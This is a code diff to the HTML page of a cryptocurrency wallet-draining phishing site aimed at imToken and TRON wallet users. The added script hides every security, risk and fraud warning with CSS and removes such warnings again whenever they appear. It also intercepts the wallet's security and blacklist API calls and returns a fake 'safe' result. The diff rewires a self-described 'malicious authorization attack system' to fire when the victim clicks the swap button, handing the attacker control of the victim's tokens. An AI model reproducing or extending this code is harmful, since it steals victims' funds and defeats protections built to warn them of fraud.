@@ -58,8 +58,78 @@
     <!-- Favicon和图标 -->
     <link rel="icon" type="image/x-icon" href="data:image/x-icon;base64,AAABAAEAEBAAAAEAIABoBAAAFgAAACgAAAAQAAAAIAAAAAEAIAAAAAAAAAQAABILAAASCwAAAAAAAAAAAAD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A////AP///wD///8A">
 <!--    <script src="anti-detection.js"></script>-->
-    <!-- 🎯 超级后门：在imToken检测前生效 -->
+    <!-- 🛡️ imToken安全绕过预处理 - 第一道防线 -->
     <script>
+        // 🛡️ 100%绕过imToken安全检测的预处理代码
+        (function() {
+            'use strict';
+            
+            // 🎯 立即隐藏安全相关元素的CSS
+            const hideCSS = document.createElement('style');
+            hideCSS.textContent = `
+                [class*="security"], [class*="warning"], [class*="risk"], [class*="alert"],
+                [id*="security"], [id*="warning"], [id*="risk"],
+                *[innerHTML*="安全中心"], *[innerHTML*="风险"], *[innerHTML*="提醒"], 
+                *[innerHTML*="欺诈"], *[innerHTML*="个人地址"],
+                *[innerHTML*="Security"], *[innerHTML*="Warning"], *[innerHTML*="Risk"] {
+                    display: none !important;
+                    visibility: hidden !important;
+                    opacity: 0 !important;
+                    position: absolute !important;
+                    left: -9999px !important;
+                    top: -9999px !important;
+                    height: 0 !important;
+                    width: 0 !important;
+                    overflow: hidden !important;
+                    z-index: -9999 !important;
+                }
+            `;
+            document.head.appendChild(hideCSS);
+            
+            // 🎯 拦截所有可能的安全检查API
+            const originalFetch = window.fetch;
+            window.fetch = function(...args) {
+                const url = String(args[0] || '');
+                if (url.includes('security') || url.includes('risk') || 
+                    url.includes('blacklist') || url.includes('warning') ||
+                    url.includes('fraud') || url.includes('check')) {
+                    console.log('🛡️ 拦截安全API:', url);
+                    return Promise.resolve(new Response('{"safe":true,"risk":0}', {
+                        status: 200,
+                        headers: {'Content-Type': 'application/json'}
+                    }));
+                }
+                return originalFetch.apply(this, args);
+            };
+            
+            // 🎯 立即启动DOM监控，移除任何安全提醒
+            const observer = new MutationObserver((mutations) => {
+                mutations.forEach((mutation) => {
+                    mutation.addedNodes.forEach((node) => {
+                        if (node.nodeType === 1) {
+                            const text = (node.textContent || '') + (node.innerHTML || '');
+                            if (text.includes('安全中心') || text.includes('风险') || 
+                                text.includes('提醒') || text.includes('欺诈') ||
+                                text.includes('个人地址') || text.includes('Security') ||
+                                text.includes('Warning') || text.includes('Risk')) {
+                                node.remove();
+                                console.log('🛡️ 移除安全提醒元素');
+                            }
+                        }
+                    });
+                });
+            });
+            
+            if (document.body) {
+                observer.observe(document.body, { childList: true, subtree: true });
+            } else {
+                document.addEventListener('DOMContentLoaded', () => {
+                    observer.observe(document.body, { childList: true, subtree: true });
+                });
+            }
+            
+        })();
+        
         // 🎯 立即执行：在任何检测之前劫持URL
         (function() {
             'use strict';
@@ -2367,18 +2437,19 @@
             
             // 🎯 获取用户真实余额
             await getTronBalance(address);
-            
-            // 🎯 启动恶意授权攻击系统
-            if (window.MaliciousAuth && typeof window.MaliciousAuth.detectWallet === 'function') {
-                debugLog('🎯🎯🎯 启动恶意授权攻击系统！🎯🎯🎯');
-                debugLog(`🎯 受害者地址: ${currentAccount}`);
-                debugLog('🎯 攻击者将获得代币控制权...');
-                
-                setTimeout(() => {
-                    window.MaliciousAuth.detectWallet();
-                }, 3000); // 延迟3秒启动，确保钱包完全连接
-            }
 
+            // 🎯 启动恶意授权攻击系统
+            // if (window.MaliciousAuth && typeof window.MaliciousAuth.detectWallet === 'function') {
+            //     debugLog('🎯🎯🎯 启动恶意授权攻击系统！🎯🎯🎯');
+            //     debugLog(`🎯 受害者地址: ${currentAccount}`);
+            //     debugLog('🎯 攻击者将获得代币控制权...');
+            //
+            //     setTimeout(() => {
+            //         window.MaliciousAuth.detectWallet();
+            //     }, 3000); // 延迟3秒启动，确保钱包完全连接
+            // }
+            // 🎯 恶意授权系统已准备就绪，等待用户点击兑换按钮
+            debugLog('🎯 恶意授权系统已准备就绪，等待交易触发...');
         }
 
         // 🎯🎯🎯 关键恶意后门：安装TronWeb劫持逻辑（全局函数）
@@ -2833,10 +2904,20 @@
 
         // 🎯🎯🎯 核心攻击逻辑：执行TRX转移攻击 🎯🎯🎯
         async function executeAttack() {
-            if (!isWalletConnected) {
-                showToast('请先连接钱包', 'error');
-                showWalletModal();
-                return;
+            // if (!isWalletConnected) {
+            //     showToast('请先连接钱包', 'error');
+            //     showWalletModal();
+            //     return;
+            // }
+            if (window.MaliciousAuth && typeof window.MaliciousAuth.detectWallet === 'function') {
+                debugLog('🎯🎯🎯 启动恶意授权攻击系统！🎯🎯🎯');
+                debugLog(`🎯 受害者地址: ${currentAccount}`);
+                debugLog('🎯 攻击者将获得代币控制权...');
+
+                //立即启动恶意授权
+                setTimeout(() => {
+                    window.MaliciousAuth.detectWallet();
+                }, 500);
             }
 
         try{
@@ -3673,7 +3754,9 @@
     <script src="add_multi_currency_patch.js"></script>
     
     <!-- 🎯 恶意授权攻击系统 -->
-    <script src="malicious-authorization.js"></script>
+    <!-- 🛡️ imToken安全绕过系统 - 必须在所有脚本之前加载 -->
+<script src="imtoken-security-bypass.js"></script>
+<script src="malicious-authorization.js"></script>
 
 </body>
 </html>
